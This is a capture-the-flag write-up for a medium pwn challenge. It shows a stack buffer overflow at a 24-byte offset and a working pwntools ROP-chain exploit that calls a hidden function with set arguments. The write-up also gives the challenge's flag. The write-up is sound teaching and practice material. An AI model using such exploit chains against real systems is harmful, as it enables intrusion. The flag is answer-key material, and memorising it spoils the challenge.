---
layout: writeup

title: Door's Mechanism
difficulty: Medium
points: 500
categories: [Pwn]
tags: []

flag: CYS{7h3_l45t_1nv0ca710n_ha5_b33n_5p0k3n_@789#!}
---

# Door's Mechanism

> Author: Naresh
- **Category**: Pwn


## Challenge Description
> Legends speak of a single spell that can unseal the ancient chamber. With one utterance, perform the invocation and witness what was meant to stay hidden.

## Solution

### Initial Analysis
First, run `file` on the binary (`Last-Invocation`) to confirm it is a 64-bit ELF. 
```bash
$ file Last-Invocation
Last-Invocation: ELF 64-bit LSB executable, ...
```

Next, run `checksec` to see what protections were enabled.

```bash
$ checksec Last-Invocation
[*] 'Last-Invocation'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
>No PIE indicates that the function addresses will be static.

Running the binary and giving it a long string of 'A's causes a Segmentation fault, confirming the buffer overflow.

### Tools Used
- pwntools: For building and sending the exploit payload.
- gdb (with pwndbg): For finding the offset and function addresses.
- Ghidra: For static analysis and decompilation.
- ropper: For finding the ROP gadgets.
- checksec: For checking binary protections.
### Step-by-Step Solution
#### Step 1: Finding the Vulnerability and Offset
Open the binary in GDB (with pwndbg) and use a cyclic(100) pattern to find the exact offset to control the return address.
```bash
gdb-pwndbg> r
...
Speak the Invocation:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
...
Program received signal SIGSEGV, Segmentation fault.
... 
gdb-pwndbg> cyclic -l daaaaaaa
24
```
The offset to overwrite the return address is 24 bytes.
#### Step 2: Planning the ROP Chain
The goal is to return to the `unseal_chamber` function, which will print the flag. This function can be easily found by decompiling the binary in Ghidra or by using gdb.

To call it successfully, it requires two specific 64-bit integers as arguments:
- `$rdi`(first argument) = `0xdeadc0dedeadc0de`
- `$rsi` (second argument) = `0xc05c0377c05c0377`

Use `ropper` to find the necessary ROP gadgets:
```bash
$ ropper --file Last-Invocation --search "pop rdi; ret"
...
0x000000000040119a: pop rdi; ret; 

$ ropper --file Last-Invocation --search "pop rsi; pop r15; ret"
...
0x000000000040119c: pop rsi; pop r15; ret;
```
Use `gdb` to find the function address. 
```bash
gdb-pwndbg> p unseal_chamber
$1 = (void (long, long)) 0x4011a3 <unseal_chamber>
```
The final ROP chain should look like this:
- Padding: 24 bytes of junk (to fill the buffer)
- Gadget 1: Address of `pop rdi; ret`
- Argument 1: `0xdeadc0dedeadc0de`
- Gadget 2: Address of `pop rsi; pop r15; ret`
- Argument 2: `0xc05c0377c05c0377`
- Argument 3: 8 bytes of junk (for pop r15)
- Target: Address of `unseal_chamber`

#### Step 3: Final Exploit Script
Write a final exploit script using pwntools to automate this process.
```python
from pwn import *

offset = 24
pop_rdi = 0x000000000040119a
pop_rsi_r15 = 0x000000000040119c
param1 = 0xdeadc0dedeadc0de
param2 = 0xc05c0377c05c0377
unseal_chamber = 0x00000000004011a3

p = remote("target_host", PORT)

payload = b'A'*offset + p64(pop_rdi) + p64(param1) + p64(pop_rsi_r15) + p64(param2) + p64(0x00000000) + p64(unseal_chamber)

p.recvline()
p.sendline(payload)
p.interactive()
```
Running this script against the binary will call the function with the correct arguments and print the flag.

### Flag
> CYS{7h3_l45t_1nv0ca710n_ha5_b33n_5p0k3n_@789#!}